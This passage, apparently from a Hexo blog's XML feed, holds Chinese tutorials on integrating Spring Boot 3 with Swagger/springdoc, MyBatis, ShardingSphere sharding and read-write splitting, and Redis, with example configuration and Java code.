 .contact(<span class="keyword">new</span> <span class="title class_">Contact</span>()</span><br><span class="line">                      .name(contactName)</span><br><span class="line">                      .url(contactUrl)</span><br><span class="line">                      .email(contactEmail))</span><br><span class="line">                  .license(<span class="keyword">new</span> <span class="title class_">License</span>()</span><br><span class="line">                      .name(licenseName)</span><br><span class="line">                      .url(licenseUrl)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的配置信息可以通过在 application.properties 或 application.yml 文件中进行配置，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">springdoc.version=1.0</span><br><span class="line">springdoc.title=My API</span><br><span class="line">springdoc.description=This is my API description</span><br><span class="line">springdoc.termsOfServiceUrl=https://example.com/terms</span><br><span class="line">springdoc.contact.name=John Doe</span><br><span class="line">springdoc.contact.url=https://example.com/contact</span><br><span class="line">springdoc.contact.email=john@example.com</span><br><span class="line">springdoc.license.name=MIT License</span><br><span class="line">springdoc.license.url=https://opensource.org/licenses/MIT</span><br></pre></td></tr></table></figure>
<p>如果你使用的是 Spring Webflux，还需要添加相应的依赖和配置。对于 Spring Webflux 项目，添加springdoc-openapi-starter-webflux-ui依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springdoc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springdoc-openapi-starter-webflux-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<p>然后配置 Swagger3，示例配置类如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.config.EnableWebFlux;</span><br><span class="line"><span class="keyword">import</span> io.swagger.v3.oas.models.OpenAPI;</span><br><span class="line"><span class="keyword">import</span> io.swagger.v3.oas.models.info.Info;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebFlux</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OpenApiWebFluxConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> OpenAPI <span class="title function_">customOpenAPI</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OpenAPI</span>()</span><br><span class="line">              .info(<span class="keyword">new</span> <span class="title class_">Info</span>()</span><br><span class="line">                  .title(<span class="string">&quot;WebFlux API&quot;</span>)</span><br><span class="line">                  .version(<span class="string">&quot;1.0&quot;</span>)</span><br><span class="line">                  .description(<span class="string">&quot;This is a WebFlux API with Swagger3&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用 Swagger 注解</p>
</blockquote>
<p>在你的控制器类和方法上，可以使用 Swagger 的注解来提供更多的接口信息和自定义。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> io.swagger.v3.oas.annotations.Operation;</span><br><span class="line"><span class="keyword">import</span> io.swagger.v3.oas.annotations.media.Content;</span><br><span class="line"><span class="keyword">import</span> io.swagger.v3.oas.annotations.media.Schema;</span><br><span class="line"><span class="keyword">import</span> io.swagger.v3.oas.annotations.responses.ApiResponse;</span><br><span class="line"><span class="keyword">import</span> io.swagger.v3.oas.annotations.responses.ApiResponses;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/example&quot;)</span></span><br><span class="line">    <span class="meta">@Operation(summary = &quot;Get example data&quot;, description = &quot;Returns example data from the server&quot;)</span></span><br><span class="line">    <span class="meta">@ApiResponses(value = &#123;</span></span><br><span class="line"><span class="meta">        @ApiResponse(responseCode = &quot;200&quot;, description = &quot;Successfully retrieved data&quot;,</span></span><br><span class="line"><span class="meta">            content = @Content(schema = @Schema(implementation = String.class))),</span></span><br><span class="line"><span class="meta">        @ApiResponse(responseCode = &quot;404&quot;, description = &quot;Data not found&quot;,</span></span><br><span class="line"><span class="meta">            content = @Content)&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getExampleData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This is example data&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>访问 Swagger UI</p>
</blockquote>
<p>当你完成上述配置并启动 Spring Boot 应用后，就可以通过浏览器访问 Swagger UI 来查看和测试你的 API 接口文档了。默认情况下，访问路径为<a href="http://localhost:8080/swagger">http://localhost:8080/swagger</a> - ui&#x2F; 或<a href="http://localhost:8080/swagger">http://localhost:8080/swagger</a> - ui&#x2F;index.html （请根据你的实际端口号进行替换）。在 Swagger UI 界面中，你可以清晰地看到各个接口的信息，包括接口路径、请求方法、参数、响应等，并且还可以直接在界面上进行接口测试。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3集成五【MyBatis框架】</title>
    <url>/cnblogs.github.io/p/a56c.html</url>
    <content><![CDATA[<h3 id="依赖配置"><a href="#依赖配置" class="headerlink" title="依赖配置"></a>依赖配置</h3><p>在 Spring Boot3 项目中，首先需要在pom.xml文件中添加 MyBatis 和 Spring Boot 整合的依赖。确保使用的mybatis-spring-boot-starter版本与 Spring Boot 3 兼容。例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>同时，根据项目所使用的数据库类型，添加相应的数据库驱动依赖。比如使用 MySQL 数据库，添加如下依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Mapper-接口定义"><a href="#Mapper-接口定义" class="headerlink" title="Mapper 接口定义"></a>Mapper 接口定义</h3><p>创建 Mapper 接口，在接口中定义数据库操作方法。例如，创建一个UserMapper接口，用于对用户表进行操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;SELECT * FROM user&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">getAllUsers</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里使用了@Mapper注解，它可以让 Spring Boot 自动将 Mapper 接口注册为 Bean。如果项目中 Mapper 接口较多，可以在启动类上使用@MapperScan注解指定 Mapper 接口所在的包，如@MapperScan(“com.example.demo.mapper”) ，这样就无需在每个 Mapper 接口上都添加@Mapper注解。</p>
<h3 id="Mapper-XML-文件配置"><a href="#Mapper-XML-文件配置" class="headerlink" title="Mapper XML 文件配置"></a>Mapper XML 文件配置</h3><p>创建与 Mapper 接口对应的 Mapper XML 文件，例如UserMapper.xml。在 XML 文件中编写具体的 SQL 语句，并通过namespace属性与 Mapper 接口进行关联。示例如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.demo.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getAllUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.demo.entity.User&quot;</span>&gt;</span></span><br><span class="line">        SELECT * FROM user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要注意的是，application.properties或application.yml配置文件中的mybatis.mapper-locations属性要正确指向 Mapper XML 文件的位置，如mybatis.mapper-locations&#x3D;classpath:mapper&#x2F;*.xml。</p>
<h3 id="使用-Mapper-接口"><a href="#使用-Mapper-接口" class="headerlink" title="使用 Mapper 接口"></a>使用 Mapper 接口</h3><p>在 Service 层或 Controller 层中，通过依赖注入的方式使用 Mapper 接口。例如，在 Service 层：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">getUsers</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.getAllUsers();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 Controller 层：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/users&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">getUsers</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userService.getUsers();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3集成八【ShardingSphere分库分表框架】</title>
    <url>/cnblogs.github.io/p/3cbb.html</url>
    <content><![CDATA[<p>在众多分库分表框架中，ShardingSphere 以其强大的功能和广泛的应用而备受青睐。接下来，我们详细看看如何在 Spring Boot3 项目中整合 ShardingSphere 实现分库分表。</p>
<h2 id="工程搭建"><a href="#工程搭建" class="headerlink" title="工程搭建"></a>工程搭建</h2><h3 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h3><p>在pom.xml文件中添加必要的依赖。核心组件包括shardingsphere-jdbc和mybatis。以<br>shardingsphere-jdbc-core-spring-boot-starter为例，版本可以选用 5.2.1，mybatis-spring-boot-starter版本选用 3.5.13。同时，要注意添加 MySQL 驱动以及分页等相关依赖，并根据实际情况添加排除配置。例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatis.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shardingsphere<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shardingsphere-jdbc-core-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;shardingsphere.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>在application.yml文件中进行分库分表相关配置。假设我们有一个默认数据源db_master，以及用于分库分表的数据源db_0和db_1。配置如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">shardingsphere:</span></span><br><span class="line">    <span class="attr">datasource:</span></span><br><span class="line">      <span class="attr">default-data-source-name:</span> <span class="string">db_master</span></span><br><span class="line">      <span class="attr">names:</span> <span class="string">db_master,db_0,db_1</span></span><br><span class="line">      <span class="attr">db_master:</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">com.zaxxer.hikari.HikariDataSource</span></span><br><span class="line">        <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">        <span class="attr">jdbc-url:</span> <span class="string">jdbc:mysql://localhost:3306/shard_db</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">        <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">db_0:</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">com.zaxxer.hikari.HikariDataSource</span></span><br><span class="line">        <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">        <span class="attr">jdbc-url:</span> <span class="string">jdbc:mysql://localhost:3306/shard_db_0</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">        <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">db_1:</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">com.zaxxer.hikari.HikariDataSource</span></span><br><span class="line">        <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">        <span class="attr">jdbc-url:</span> <span class="string">jdbc:mysql://localhost:3306/shard_db_1</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">        <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">rules:</span></span><br><span class="line">      <span class="attr">sharding:</span></span><br><span class="line">        <span class="attr">tables:</span></span><br><span class="line">          <span class="attr">tb_order:</span></span><br><span class="line">            <span class="attr">actual-data-nodes:</span> <span class="string">db_$&#123;0..1&#125;.tb_order_$&#123;0..2&#125;</span></span><br><span class="line">            <span class="attr">database-strategy:</span></span><br><span class="line">              <span class="attr">standard:</span></span><br><span class="line">                <span class="attr">sharding-column:</span> <span class="string">order_id</span></span><br><span class="line">                <span class="attr">sharding-algorithm-name:</span> <span class="string">database_inline</span></span><br><span class="line">            <span class="attr">table-strategy:</span></span><br><span class="line">              <span class="attr">standard:</span></span><br><span class="line">                <span class="attr">sharding-column:</span> <span class="string">order_id</span></span><br><span class="line">                <span class="attr">sharding-algorithm-name:</span> <span class="string">table_inline</span></span><br><span class="line">        <span class="attr">sharding-algorithms:</span></span><br><span class="line">          <span class="attr">database_inline:</span></span><br><span class="line">            <span class="attr">type:</span> <span class="string">INLINE</span></span><br><span class="line">            <span class="attr">props:</span></span><br><span class="line">              <span class="attr">algorithm-expression:</span> <span class="string">db_$&#123;order_id</span> <span class="string">%</span> <span class="number">2</span><span class="string">&#125;</span></span><br><span class="line">          <span class="attr">table_inline:</span></span><br><span class="line">            <span class="attr">type:</span> <span class="string">INLINE</span></span><br><span class="line">            <span class="attr">props:</span></span><br><span class="line">              <span class="attr">algorithm-expression:</span> <span class="string">tb_order_$&#123;order_id</span> <span class="string">%</span> <span class="number">3</span><span class="string">&#125;</span></span><br><span class="line">        <span class="attr">props:</span></span><br><span class="line">          <span class="attr">sql-show:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">sql-comment-parse-enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>在这个配置中，我们定义了tb_order逻辑表，它会根据order_id字段值定位数据所属的分片节点。库路由采用db_${order_id%2}的算法，表路由采用tb_order_${order_id%3}的算法。</p>
<h3 id="配置原理"><a href="#配置原理" class="headerlink" title="配置原理"></a>配置原理</h3><ul>
<li>数据源管理：在配置中，我们管理了三个数据源。shard_db作为默认库，当操作不涉及需要路由的表时，默认使用该数据源。shard_db_0和shard_db_1则是tb_order逻辑表的路由库。</li>
<li>逻辑表与实际表的映射：逻辑表tb_order整体使用两个数据库，每个库建 3 张结构相同的表。在操作tb_order数据时，ShardingSphere 会根据配置的算法，依据order_id字段值自动将数据路由到对应的数据库和表。例如，当order_id为 5 时，根据库路由算法order_id % 2，会将数据路由到db_1库；再根据表路由算法order_id % 3，会将数据路由到tb_order_2表。</li>
</ul>
<h2 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h2><h3 id="主库操作"><a href="#主库操作" class="headerlink" title="主库操作"></a>主库操作</h3><p>基于 Mybatis 持久层框架，我们可以实现对shard_db默认库的数据操作。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MasterTest</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BuyerMapper buyerMapper;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> SellerMapper sellerMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testBuyerQuery</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Buyer</span> <span class="variable">buyer</span> <span class="operator">=</span> buyerMapper.selectByPrimaryKey(<span class="number">1</span>);</span><br><span class="line">        System.out.println(buyer.getId() + <span class="string">&quot;;&quot;</span> + buyer.getBuyerName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testBuyerInsert</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Buyer</span> <span class="variable">buyer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Buyer</span>();</span><br><span class="line">        buyer.setBuyerName(<span class="string">&quot;买家Three&quot;</span>);</span><br><span class="line">        System.out.println(buyerMapper.insert(buyer));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testBuyerUpdate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Buyer</span> <span class="variable">buyer</span> <span class="operator">=</span> buyerMapper.selectByPrimaryKey(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">if</span> (buyer != <span class="literal">null</span>) &#123;</span><br><span class="line">            buyer.setBuyerName(<span class="string">&quot;Three买家&quot;</span>);</span><br><span class="line">            System.out.println(buyerMapper.updateByPrimaryKey(buyer));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个测试类中，我们通过BuyerMapper对shard_db库中的Buyer表进行查询、插入和更新操作。在实际执行过程中，我们可以通过控制台日志打印，看到 ShardingSphere 对 SQL 语句的解析逻辑以及库表节点的定位过程。如果需要进行分页查询，使用PageHelper组件即可轻松实现</p>
<h2 id="读写分离优化"><a href="#读写分离优化" class="headerlink" title="读写分离优化"></a>读写分离优化</h2><p>在高负载的系统环境下，读写分离是进一步提升数据库性能的重要手段。通过将读操作和写操作分散到不同的服务器上，可以有效减轻单个服务器的压力，提高系统的整体性能。</p>
<h3 id="主从架构原理"><a href="#主从架构原理" class="headerlink" title="主从架构原理"></a>主从架构原理</h3><p>在主从架构中，主库（Master）负责处理所有的写操作，如数据插入、更新和删除。从库（Slave）则主要用于处理读取请求。主库的数据会自动同步至从库，以确保数据的一致性。例如，在一个新闻资讯平台中，当有新的新闻发布时，写操作会在主库执行，而大量用户浏览新闻的读操作则由从库承担。</p>
<h3 id="ShardingSphere-实现读写分离"><a href="#ShardingSphere-实现读写分离" class="headerlink" title="ShardingSphere 实现读写分离"></a>ShardingSphere 实现读写分离</h3><p>在 ShardingSphere 中实现读写分离，我们可以通过配置来指定读操作和写操作的数据源。例如，在application.yml文件中添加如下配置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">shardingsphere:</span></span><br><span class="line">    <span class="attr">masterslave:</span></span><br><span class="line">      <span class="attr">load-balance-algorithm-type:</span> <span class="string">ROUND_ROBIN</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">ms</span></span><br><span class="line">      <span class="attr">master-data-source-name:</span> <span class="string">master</span></span><br><span class="line">      <span class="attr">slave-data-source-names:</span> <span class="string">slave_0,slave_1</span></span><br></pre></td></tr></table></figure>
<p>在这个配置中，我们定义了一个名为ms的读写分离规则，主数据源为master，从数据源为slave_0和slave_1。load-balance-algorithm-type指定了负载均衡算法为ROUND_ROBIN，即轮询算法，它会按照顺序依次将读请求分配到各个从库上，以实现负载均衡。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3集成六【Redis框架】</title>
    <url>/cnblogs.github.io/p/5e10.html</url>
    <content><![CDATA[<p><strong>依赖配置</strong><br>在 Spring Boot3 项目中，需要引入spring-boot-starter-data-redis依赖，这是使用 Redis 功能的基础。如果您使用的是 Maven 项目，在pom.xml文件中添加以下代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>连接配置</strong><br>完成依赖引入后，接下来就是连接配置。在application.yml文件中，Spring Boot3 的 Redis 配置前缀变为spring.data.redis 。最基本的配置，就是设置 Redis 服务器的主机地址和端口号：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">data:</span></span><br><span class="line">    <span class="attr">redis:</span></span><br><span class="line">      <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">6379</span></span><br></pre></td></tr></table></figure>
<p>为了让连接性能更优，我们还可以对连接池进行配置。例如，设置最大活跃连接数、最大空闲连接数、最小空闲连接数、连接等待时间等参数：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">data:</span></span><br><span class="line">    <span class="attr">redis:</span></span><br><span class="line">      <span class="attr">lettuce:</span></span><br><span class="line">        <span class="attr">pool:</span></span><br><span class="line">          <span class="attr">max-active:</span> <span class="number">8</span></span><br><span class="line">          <span class="attr">max-idle:</span> <span class="number">8</span></span><br><span class="line">          <span class="attr">min-idle:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">max-wait:</span> <span class="string">10000ms</span></span><br></pre></td></tr></table></figure>
<p><strong>序列化配置</strong><br>在实际使用中，存入 Redis 的数据如果不进行正确的序列化配置，很容易出现乱码问题。这时，我们可以通过自定义配置类，对RedisTemplate进行配置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.connection.RedisConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.StringRedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span> &#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; template = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">        template.setConnectionFactory(redisConnectionFactory);</span><br><span class="line">        <span class="comment">// 设置key的序列化方式</span></span><br><span class="line">        template.setKeySerializer(<span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>());</span><br><span class="line">        <span class="comment">// 设置hash的key的序列化方式</span></span><br><span class="line">        template.setHashKeySerializer(<span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>());</span><br><span class="line">        <span class="comment">// 设置value的序列化方式</span></span><br><span class="line">        template.setValueSerializer(<span class="keyword">new</span> <span class="title class_">GenericJackson2JsonRedisSerializer</span>());</span><br><span class="line">        <span class="comment">// 设置hash的value的序列化方式</span></span><br><span class="line">        template.setHashValueSerializer(<span class="keyword">new</span> <span class="title class_">GenericJackson2JsonRedisSerializer</span>());</span><br><span class="line">        <span class="keyword">return</span> template;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3集成十【SpringSecurity框架】</title>
    <url>/cnblogs.github.io/p/fcdb.html</url>
    <content><![CDATA[<h2 id="整合自定义数据库实现鉴权"><a href="#整合自定义数据库实现鉴权" class="headerlink" title="整合自定义数据库实现鉴权"></a>整合自定义数据库实现鉴权</h2><blockquote>
